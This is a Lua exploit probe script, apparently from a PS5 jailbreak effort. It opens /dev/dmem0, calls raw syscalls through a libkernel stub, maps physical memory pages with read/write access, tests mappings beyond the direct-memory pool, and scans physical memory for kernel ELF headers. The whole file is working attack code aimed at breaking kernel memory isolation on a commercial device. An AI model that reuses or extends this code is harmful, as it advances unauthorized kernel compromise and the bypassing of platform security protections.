-- CRASH_CLASS: LOW
-- PROBE 552h: Physical memory scan for kernel via dmem0 mmap
--
-- 552g CONFIRMED: mmap(477, MAP_SHARED, dmem0_fd, phys_offset) gives R/W
-- to allocated physical pages. AllocateDirectMemory gives phys addr.
--
-- Plan:
--   [A] Cross-validate: two mappings of same phys page share data
--   [B] Try mapping BEYOND 0x150000000 (dmem pool size)
--   [C] Scan low physical memory for kernel signatures (ELF, FreeBSD)
--   [D] Scan for page table structures

print("=== PROBE 552h: Physical memory scan for kernel ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

-- libkernel
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
if lk_lo == 0 and lk_hi == 0 then print("FAIL: libkernel"); return end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))

local alloc_fn = lk + uint64(0x17EF0)
local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_open = mk(5)

-- Open dmem0
local devpath = memory.alloc(32)
local path = "/dev/dmem0"
for i = 1, #path do wd(N(devpath) + i - 1, string.byte(path, i)) end
wd(N(devpath) + #path, 0)
local ok_o, fd_raw = pcall(function()
    return sc_open(uint64(N(devpath)), uint64(2), uint64(0))
end)
local dmem_fd = ok_o and N(fd_raw) or -1
print("dmem0 fd=" .. dmem_fd)
if dmem_fd < 0 then print("FAIL: open"); return end

-- ============================================================
-- [A] Cross-validate: two mappings of same physical page
-- ============================================================
print("")
print("[A] Cross-validation: dual mapping of same physical page")

local phys_out = memory.alloc(8)
wq(N(phys_out), uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"), uint64(0x4000),
        uint64(0x4000), uint64(0), uint64(N(phys_out)))
end)
local phys = rq(N(phys_out))
print("phys=" .. fmt(phys))

-- Map it twice
local ok1, v1 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(dmem_fd), phys)
end)
local ok2, v2 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(dmem_fd), phys)
end)

if ok1 and ok2 then
    local a1, a2 = N(v1), N(v2)
    print("map1=" .. fmt(v1) .. " map2=" .. fmt(v2))

    -- Write via map1, read via map2
    local magic = 0x12345678
    wd(a1, magic)
    local readback = rd(a2)
    print(string.format("write 0x%X to map1, read 0x%X from map2: %s",
        magic, readback or 0, readback == magic and "SAME PHYSICAL PAGE" or "DIFFERENT"))

    -- Reverse
    local magic2 = 0xABCD0000
    wd(a2 + 0x100, magic2)
    local rb2 = rd(a1 + 0x100)
    print(string.format("write 0x%X to map2+0x100, read 0x%X from map1+0x100: %s",
        magic2, rb2 or 0, rb2 == magic2 and "CONFIRMED" or "FAIL"))

    pcall(function() sc_munmap(v1, uint64(0x4000)) end)
    pcall(function() sc_munmap(v2, uint64(0x4000)) end)
else
    print("map FAIL")
end

-- ============================================================
-- [B] Map beyond dmem pool boundary (0x150000000)
-- ============================================================
print("")
print("[B] Mapping beyond dmem pool (0x150000000)")

local beyond_offsets = {
    "0x150000000", "0x160000000", "0x200000000",
    "0x300000000", "0x400000000", "0x800000000",
}

for _, off_str in ipairs(beyond_offsets) do
    if not alive() then break end
    local off = uint64(off_str)
    local ok_b, rv_b = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(1),
            uint64(1), uint64(dmem_fd), off)
    end)
    local rv = ok_b and N(rv_b) or -1
    local rh, rl = 0, 0
    if ok_b then rh, rl = get_hi_lo(rv_b)
        if rh < 0 then rh = rh + 0x100000000 end
    end
    local failed = (not ok_b) or rv == -1 or (rh == 0xFFFFFFFF)
    print(string.format("  offset=%s: %s", off_str,
        failed and "FAIL" or "MAPPED " .. fmt(rv_b)))
    if not failed then
        -- Read first bytes
        local d = rd(rv)
        print(string.format("    first dword: 0x%X", d or 0))
        pcall(function() sc_munmap(rv_b, uint64(0x4000)) end)
    end
end

-- ============================================================
-- [C] Scan low physical memory for kernel signatures
-- ============================================================
print("")
print("[C] Scanning physical memory for kernel")

-- ELF magic: 0x7F 'E' 'L' 'F' = 0x464C457F (little-endian dword)
local ELF_MAGIC = 0x464C457F

local scan_step = 0x4000   -- 16KB pages (PS5 page size)
local scan_ranges = {
    {0x0,        0x4000000, "0-64MB"},      -- low memory
    {0x4000000,  0x10000000, "64-256MB"},    -- typical kernel load area
    {0x10000000, 0x20000000, "256-512MB"},
    {0x100000000, 0x110000000, "4-4.25GB"},  -- near our allocated phys
}

local elf_found = {}

for _, range in ipairs(scan_ranges) do
    if not alive() then break end
    local start_off, end_off, label = range[1], range[2], range[3]
    print(string.format("  scanning %s (%d pages)...", label,
        (end_off - start_off) / scan_step))
    io.flush()

    local count = 0
    local fails = 0
    local off = start_off
    while off < end_off do
        if not alive() then break end
        if fails > 10 then
            print(string.format("    too many fails at offset 0x%X, skip range", off))
            break
        end

        local off_u = uint64(string.format("0x%X", off))
        local ok_m, rv_m = pcall(function()
            return sc_mmap(uint64(0), uint64(0x4000), uint64(1),
                uint64(1), uint64(dmem_fd), off_u)
        end)

        if ok_m and N(rv_m) ~= -1 then
            local addr = N(rv_m)
            local rh, rl = get_hi_lo(rv_m)
            if rh < 0 then rh = rh + 0x100000000 end

            if rh ~= 0xFFFFFFFF then
                fails = 0
                local dw = rd(addr)

                -- Check for ELF header
                if dw == ELF_MAGIC then
                    -- Read more: class (byte 4), machine (offset 18)
                    local b4 = rd(addr + 4)
                    local b18 = rd(addr + 0x12)
                    table.insert(elf_found, {
                        off = off,
                        class = b4 and (b4 % 256) or 0,
                        machine = b18 and (b18 % 256) or 0
                    })
                    print(string.format("    *** ELF at phys 0x%X class=%d machine=%d ***",
                        off, b4 and (b4 % 256) or 0, b18 and (b18 % 256) or 0))
                end

                -- Check for "FreeBSD" string (0x42534446 0x00446572)
                -- Actually check for common kernel strings
                if dw == 0x42534446 then  -- "FDSB" → "FreeBSD" backwards... no
                    print(string.format("    interesting dword 0x%X at phys 0x%X", dw, off))
                end

                pcall(function() sc_munmap(rv_m, uint64(0x4000)) end)
            else
                fails = fails + 1
            end
        else
            fails = fails + 1
        end

        count = count + 1
        off = off + scan_step
        if count % 256 == 0 then io.flush() end
    end
    print(string.format("    done: %d pages checked", count))
end

-- ============================================================
-- [D] Summary
-- ============================================================
print("")
print("=== SUMMARY ===")
print("ELF headers found: " .. #elf_found)
for i, e in ipairs(elf_found) do
    print(string.format("  [%d] phys=0x%X class=%d machine=%d %s",
        i, e.off, e.class, e.machine,
        (e.class == 2 and e.machine == 62) and "(amd64!)" or ""))
end

print("")
print("alive=" .. tostring(alive()))
print("DONE")
